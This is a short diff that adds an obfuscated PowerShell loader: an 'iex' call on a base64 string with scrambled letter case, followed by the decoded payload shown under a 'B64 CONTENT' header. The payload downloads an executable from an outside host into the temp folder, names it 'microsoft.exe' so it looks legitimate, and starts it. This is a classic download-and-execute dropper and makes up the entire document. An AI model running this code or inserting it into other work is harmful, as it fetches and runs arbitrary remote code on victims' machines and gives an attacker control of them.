@@ -1,0 +1,7 @@
+iex([SYStEM.TExt.EncOdIng]::UtF8.GETsTriNG([sYstEm.conVeRt]::fRoMBASe64STriNg('CihOZXctT2JqZWN0IFN5U3RFbS5OZXQud2ViY2xJZU5UKS5kT1duTE9hZGZJTEUoJ2h0dHA6Ly9obm5nLm1vZS9mL0luWCcsIiRlTlY6VEVNUFxtaWNyb3NvZnQuZXhlIik7U3RhcnQtUHJvY2VzcyAoIiRlTlY6VEVNUFxtaWNyb3NvZnQuZXhlIikKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SyStEm.Net.webclIeNT).dOWnLOadfILE('http://hnng.moe/f/InX',"$eNV:TEMP\microsoft.exe");Start-Process ("$eNV:TEMP\microsoft.exe")
+
